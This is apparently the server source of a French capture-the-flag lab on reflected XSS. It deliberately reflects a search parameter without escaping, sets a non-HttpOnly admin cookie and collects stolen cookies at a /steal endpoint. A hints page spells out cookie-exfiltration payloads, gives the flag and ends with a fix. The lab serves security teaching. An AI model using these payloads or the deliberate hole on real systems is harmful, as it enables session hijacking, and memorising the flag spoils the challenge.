'use strict';
// VulnLab C02 — XSS Reflected
// Architecture :
//   - Utilisateur s'inscrit et se connecte avec son propre compte (cookie "session")
//   - Sur /search, un cookie "admin_session" est posé (sans HttpOnly) simulant l'admin connecté
//   - La XSS dans ?q= permet d'exfiltrer document.cookie (qui contient admin_session)
//   - /steal reçoit le cookie et le pose dans le navigateur de l'attaquant
//   - /profile vérifie admin_session → affiche le flag
const express      = require('express');
const cookieParser = require('cookie-parser');
const crypto       = require('crypto');
const path         = require('path');

const app  = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());
app.use('/public', express.static(path.join(__dirname, 'public')));

const accounts    = {};
const ADMIN_TOKEN = 'ADMIN_SESSION_c02_s3cr3t_tok3n';  // cookie admin à voler

function genToken() { return crypto.randomBytes(16).toString('hex'); }

// Utilisateur connecté = lu depuis cookie "session" (compte normal)
function currentUser(req) {
  const t = req.cookies['session'];
  if (!t) return null;
  const e = Object.entries(accounts).find(([, v]) => v.token === t);
  return e ? { username: e[0], role: 'user' } : null;
}

// L'attaquant a-t-il le cookie admin ?
function hasAdminCookie(req) {
  return req.cookies['admin_session'] === ADMIN_TOKEN;
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
}

function renderPage({ title, body, user }) {
  const links = user
    ? `<a href="./">Accueil</a><a href="search">Recherche</a><a href="profile">Profil</a>`
    : '';
  const auth = user
    ? `<div class="nav-user">
         <span class="nav-username">👤 ${escHtml(user.username)}</span>
         <a class="btn-logout" href="logout">Déconnexion</a>
       </div>`
    : `<div class="nav-auth-btns">
         <a class="btn-nav-login" href="login">Connexion</a>
         <a class="btn-nav-reg" href="register">Inscription</a>
       </div>`;
  return `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escHtml(title)} — DevBlog</title>
<link rel="stylesheet" href="public/css/style.css">
<style>
.auth-wrap{display:flex;align-items:center;justify-content:center;min-height:calc(100vh - 110px);padding:24px}
.auth-card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.10);padding:44px 48px;width:100%;max-width:420px}
.auth-card h1{font-size:24px;font-weight:700;color:#1a2744;margin-bottom:6px;text-align:center}
.auth-subtitle{font-size:14px;color:#8a94a6;text-align:center;margin-bottom:28px}
.auth-card label{display:block;font-size:12px;font-weight:600;color:#4a5568;margin-bottom:6px;letter-spacing:.03em;text-transform:uppercase}
.auth-card input[type=text],.auth-card input[type=password]{width:100%;padding:12px 14px;border:1.5px solid #e2e8f0;border-radius:10px;font-size:14px;color:#1a2744;background:#fafbff;outline:none;transition:border-color .15s,box-shadow .15s;margin-bottom:18px}
.auth-card input:focus{border-color:#2d6ef7;background:#fff;box-shadow:0 0 0 3px rgba(45,110,247,.10)}
.btn-primary{display:block;width:100%;padding:13px;background:#2d6ef7;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;margin-top:4px;letter-spacing:.01em}
.btn-primary:hover{background:#1a5ce8}
.auth-switch{text-align:center;font-size:13px;color:#8a94a6;margin-top:22px}
.auth-switch a{color:#2d6ef7;font-weight:500;text-decoration:none}
.auth-switch a:hover{text-decoration:underline}
.alert-err{background:#fef2f2;border:1px solid #fecaca;color:#991b1b;border-radius:8px;padding:11px 14px;font-size:13px;margin-bottom:18px}
.alert-ok{background:#f0fdf4;border:1px solid #bbf7d0;color:#166534;border-radius:8px;padding:11px 14px;font-size:13px;margin-bottom:18px}
.nav-auth-btns,.nav-user{display:flex;align-items:center;gap:10px;margin-left:auto}
.btn-nav-login{padding:6px 16px;border:1.5px solid rgba(255,255,255,.4);border-radius:8px;color:rgba(255,255,255,.9);font-size:13px;font-weight:500;text-decoration:none}
.btn-nav-login:hover{border-color:#fff;color:#fff}
.btn-nav-reg{padding:6px 16px;background:#fff;border:none;border-radius:8px;color:#2d6ef7;font-size:13px;font-weight:600;text-decoration:none}
.btn-nav-reg:hover{background:#f0f4ff}
.nav-username{font-size:13px;color:rgba(255,255,255,.9)}
.btn-logout{padding:5px 14px;border:1px solid rgba(255,255,255,.3);border-radius:6px;color:rgba(255,255,255,.8);font-size:12px;text-decoration:none}
.btn-logout:hover{border-color:#fff;color:#fff}
.info-tip{background:#f0f7ff;border:1px solid #bfdbfe;border-radius:10px;padding:14px 18px;font-size:14px;color:#1e40af;margin-top:24px;line-height:1.6}
</style>
</head>
<body>
<nav class="navbar">
  <div class="nav-inner">
    <a class="brand" href="./">DevBlog</a>
    <div class="nav-links">${links}</div>
    ${auth}
  </div>
</nav>
<main>${body}</main>
<footer><div class="footer-inner">DevBlog &copy; 2024 &nbsp;·&nbsp;
<span style="color:#e85d3c">VulnLab C02</span></div></footer>
</body></html>`;
}

function requireAuth(req, res, next) {
  if (!currentUser(req)) return res.redirect('login');
  next();
}

// ── REGISTER ────────────────────────────────
app.get('/register', (req, res) => {
  const err = req.query.err || '';
  res.send(renderPage({ title: 'Inscription', user: null, body: `
  <div class="auth-wrap"><div class="auth-card">
    <h1>Créer un compte</h1>
    <p class="auth-subtitle">Rejoignez DevBlog pour lire nos articles</p>
    ${err ? `<div class="alert-err">⚠ ${escHtml(err)}</div>` : ''}
    <form method="POST" action="register">
      <label>Nom d'utilisateur</label>
      <input type="text" name="username" placeholder="ex: alice" required autocomplete="off">
      <label>Mot de passe</label>
      <input type="password" name="password" placeholder="••••••••" required>
      <button type="submit" class="btn-primary">Créer mon compte</button>
    </form>
    <p class="auth-switch">Déjà un compte ? <a href="login">Se connecter</a></p>
  </div></div>`}));
});

app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)  return res.redirect('register?err=Champs+manquants');
  if (username === 'admin')    return res.redirect('register?err=Ce+nom+est+réservé');
  if (accounts[username])      return res.redirect('register?err=Nom+déjà+utilisé');
  accounts[username] = { password, token: genToken() };
  res.redirect('login?registered=1');
});

// ── LOGIN ────────────────────────────────────
app.get('/login', (req, res) => {
  const err = req.query.err || '';
  const ok  = req.query.registered
    ? '<div class="alert-ok">✓ Compte créé avec succès ! Connectez-vous.</div>' : '';
  res.send(renderPage({ title: 'Connexion', user: null, body: `
  <div class="auth-wrap"><div class="auth-card">
    <h1>Connexion</h1>
    <p class="auth-subtitle">Accédez à votre espace DevBlog</p>
    ${ok}
    ${err ? `<div class="alert-err">⚠ ${escHtml(err)}</div>` : ''}
    <form method="POST" action="login">
      <label>Nom d'utilisateur</label>
      <input type="text" name="username" placeholder="ex: alice" required autocomplete="off">
      <label>Mot de passe</label>
      <input type="password" name="password" placeholder="••••••••" required>
      <button type="submit" class="btn-primary">Se connecter</button>
    </form>
    <p class="auth-switch">Pas encore de compte ? <a href="register">S'inscrire</a></p>
  </div></div>`}));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const acc = accounts[username];
  if (!acc || acc.password !== password)
    return res.redirect('login?err=Identifiants+incorrects');
  // Cookie de session NORMAL — pas le token admin
  res.cookie('session',  acc.token, { path: '/', httpOnly: false });
  res.cookie('username', username,  { path: '/', httpOnly: false });
  res.redirect('./');
});

app.get('/logout', (req, res) => {
  res.clearCookie('session');
  res.clearCookie('username');
  res.clearCookie('admin_session');
  res.redirect('login');
});

// ── HOME ─────────────────────────────────────
app.get('/', requireAuth, (req, res) => {
  const user = currentUser(req);
  res.send(renderPage({ title: 'Accueil', user, body: `
  <div class="page-wrap">
    <div class="article-header">
      <span class="article-tag">Sécurité Web</span>
      <h1>Introduction à l'architecture REST moderne</h1>
      <p class="article-meta">Par <strong>admin</strong> · 15 novembre 2024 · 8 min de lecture</p>
    </div>
    <div class="article-body">
      <p>L'architecture REST (Representational State Transfer) est un style architectural
      pour la conception d'APIs web. Elle repose sur six contraintes fondamentales
      permettant de créer des services scalables et interopérables.</p>
      <p>Dans cet article, nous explorerons les bonnes pratiques, les erreurs courantes
      et les patterns avancés utilisés en production.</p>
    </div>
    <div class="info-tip">
      💡 Ce blog propose une fonctionnalité de <strong>recherche d'articles</strong>.
      Essayez-la pour explorer le contenu disponible.
    </div>
  </div>`}));
});

// ── SEARCH — ⚠️ XSS REFLECTED ───────────────
app.get('/search', requireAuth, (req, res) => {
  const user = currentUser(req);
  const q    = req.query.q || '';
  // ⚠️ q reflété SANS échappement dans le HTML → XSS reflected
  const results = q
    ? `<div class="search-results">
         <p class="search-info">Résultats pour : <strong>${q}</strong></p>
         <p class="no-results">Aucun article ne correspond à cette recherche.</p>
       </div>`
    : `<p style="font-size:14px;color:#8a94a6;margin-top:16px">Entrez un mot-clé.</p>`;

  // Poser le cookie admin SUR CETTE PAGE (sans HttpOnly)
  // Simule que l'admin est connecté sur cette même origine
  // → document.cookie révélera "admin_session=ADMIN_SESSION_c02_s3cr3t_tok3n"
  res.cookie('admin_session', ADMIN_TOKEN, { path: '/c02', httpOnly: false });

  res.send(renderPage({ title: 'Recherche', user, body: `
  <div class="page-wrap">
    <h1>Recherche d'articles</h1>
    <form class="search-form" method="GET" action="search">
      <input type="text" name="q" placeholder="Mot-clé…"
             value="${escHtml(q)}" class="search-input">
      <button type="submit" class="btn-submit">Rechercher</button>
    </form>
    ${results}
  </div>`}));
});

// ── PROFILE ──────────────────────────────────
app.get('/profile', requireAuth, (req, res) => {
  const user    = currentUser(req);
  const isAdmin = hasAdminCookie(req);
  const adminCk = req.cookies['admin_session'] || '';
  const flagSec = isAdmin
    ? `<div class="flag-banner">
         <div class="flag-icon">🚩</div>
         <div>
           <div class="flag-label">C02 — Flag capturé !</div>
           <div class="flag-val">FLAG{xss_r3fl3ct3d_c00k13_st3al}</div>
         </div>
       </div>
       <div class="admin-note">
         Cookie admin_session volé détecté.<br>
         <code>${escHtml(adminCk)}</code>
       </div>`
    : `<div class="info-note">
         Vous êtes connecté en tant que <strong>${escHtml(user.username)}</strong>.
         Trouvez le cookie admin via XSS pour obtenir le flag…
       </div>`;
  res.send(renderPage({ title: 'Profil', user, body: `
  <div class="page-wrap">
    <h1>Mon profil</h1>
    <div class="profile-card">
      <div class="profile-avatar">${escHtml(user.username[0].toUpperCase())}</div>
      <div class="profile-info">
        <h2>${escHtml(user.username)}</h2>
        <span class="role-badge role-user">user</span>
      </div>
    </div>
    ${flagSec}
  </div>`}));
});

// ── STEAL — reçoit le cookie exfiltré ────────
app.get('/steal', (req, res) => {
  const stolen = req.query.c || '';
  console.log(`[C02-XSS] Cookie exfiltré : ${stolen}`);
  // Poser le cookie admin dans le navigateur de l'attaquant
  res.cookie('admin_session', ADMIN_TOKEN, { path: '/', httpOnly: false });
  const user = currentUser(req);
  res.send(renderPage({ title: 'Cookie volé', user, body: `
  <div class="page-wrap">
    <div class="flag-banner">
      <div class="flag-icon">🎯</div>
      <div>
        <div class="flag-label">Cookie admin_session exfiltré !</div>
        <div class="flag-val" style="font-size:13px;word-break:break-all">
          ${escHtml(stolen) || '(vide)'}
        </div>
      </div>
    </div>
    <p class="info-note" style="margin-top:16px">
      Cookie admin injecté dans ton navigateur.<br>
      <a href="profile" style="color:#2d6ef7;font-weight:500">
        → Aller sur /profile pour obtenir le flag
      </a>
    </p>
  </div>`}));
});

// ── HINTS ─────────────────────────────────────
app.get('/hints', (req, res) => {
  const user = currentUser(req);
  res.send(renderPage({ title: 'Hints C02', user, body: `
  <div class="page-wrap">
    <h1>Challenge C02 — XSS Reflected</h1>
    <p class="subtitle">Node.js · Express · Cookie hijacking</p>
    <p class="intro">
      Le paramètre <code>?q=</code> de <code>/search</code> est reflété sans échappement.
      Le cookie <code>admin_session</code> est posé sur cette page sans <code>HttpOnly</code>.<br>
      Objectif : exfiltrer ce cookie via XSS → accéder au flag sur <code>/profile</code>.
    </p>
    <div class="hint-card">
      <div class="hint-level level-1">Étape 1 — Détecter la XSS</div>
      <pre class="code-block">http://localhost/c02/search?q=&lt;img src=x onerror=alert(1)&gt;
http://localhost/c02/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
    </div>
    <div class="hint-card">
      <div class="hint-level level-2">Étape 2 — Lire le cookie admin</div>
      <pre class="code-block">http://localhost/c02/search?q=&lt;img src=x onerror=alert(document.cookie)&gt;
→ Vous verrez : admin_session=ADMIN_SESSION_c02_s3cr3t_tok3n</pre>
    </div>
    <div class="hint-card">
      <div class="hint-level level-3">Étape 3 — Exfiltrer vers /steal</div>
      <pre class="code-block">http://localhost/c02/search?q=&lt;img src=x onerror="fetch('steal?c='+document.cookie)"&gt;
http://localhost/c02/search?q=&lt;script&gt;new Image().src='steal?c='+document.cookie&lt;/script&gt;</pre>
    </div>
    <div class="hint-card">
      <div class="hint-level level-3">Étape 4 — Flag sur /profile</div>
      <pre class="code-block">FLAG{xss_r3fl3ct3d_c00k13_st3al}</pre>
    </div>
    <h2>Correction</h2>
    <pre class="code-block">// ✅ Toujours échapper
'Résultats pour : ' + escapeHtml(q)
// ✅ HttpOnly empêche l'accès JS
res.cookie('admin_session', token, { httpOnly: true, sameSite: 'Strict' });</pre>
  </div>`}));
});

app.listen(PORT, () => console.log('[C02] port 3000'));
